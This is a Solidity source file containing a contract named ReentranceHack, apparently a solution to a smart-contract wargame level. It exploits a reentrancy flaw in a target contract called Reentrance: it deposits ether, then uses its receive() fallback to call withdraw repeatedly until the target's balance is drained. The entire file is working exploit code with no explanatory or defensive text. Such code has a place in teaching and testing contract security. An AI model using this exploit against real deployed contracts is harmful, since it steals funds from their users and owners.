pragma solidity ^0.6.0;

contract ReentranceHack {
  Reentrance public reentranceInstance;
  uint256 depositAmount;

  constructor (address payable _reentranceAddress) public {
    reentranceInstance = Reentrance(_reentranceAddress);
  }

  receive() external payable {
    _withDrawAttack();
  }

  function attack() public payable{
    depositAmount = msg.value;
    reentranceInstance.donate{value: depositAmount}(address(this));
    _withDrawAttack();
  }

  function _withDrawAttack() private {
    uint256 reentranceBalance = address(reentranceInstance).balance;

    if(0 < reentranceBalance) {
      uint256 withdrawAmount = depositAmount < reentranceBalance ? depositAmount : reentranceBalance;
      reentranceInstance.withdraw(withdrawAmount);
    }
  }
}